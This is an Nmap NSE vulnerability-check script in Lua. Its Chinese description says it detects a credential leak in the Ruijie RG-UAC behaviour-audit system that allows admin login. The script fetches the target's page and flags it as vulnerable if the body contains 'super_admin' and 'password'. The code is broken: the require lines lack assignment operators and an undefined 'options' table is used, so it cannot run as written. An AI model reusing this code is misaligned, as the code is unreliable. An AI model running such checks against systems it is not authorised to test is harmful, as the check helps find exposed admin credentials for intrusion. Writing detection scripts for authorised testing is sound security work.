local http require "http"
local string require "string"
local stdnse require "stdnse"
local shortport require "shortport"


description = [[
锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露,
可以间接获取用户账号密码信息登录后台
]]

author = "seaung"

portrule = shortport.http

action = function(host, port)
	local output = stdnse.output_table()
	local admin_txt = "super_admin"
	local pass_txt = "password"
	options["headers"]["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
	local response = http.get(host, port)

	if string.find(response.body, admin_txt) ~= nil and string.find(response.body, pass_txt) ~= nil and response.status == 200 then
		output = "[+] Found vulnerable"
	else
		output = "Not Found vulnerable"
	end
	return output
end
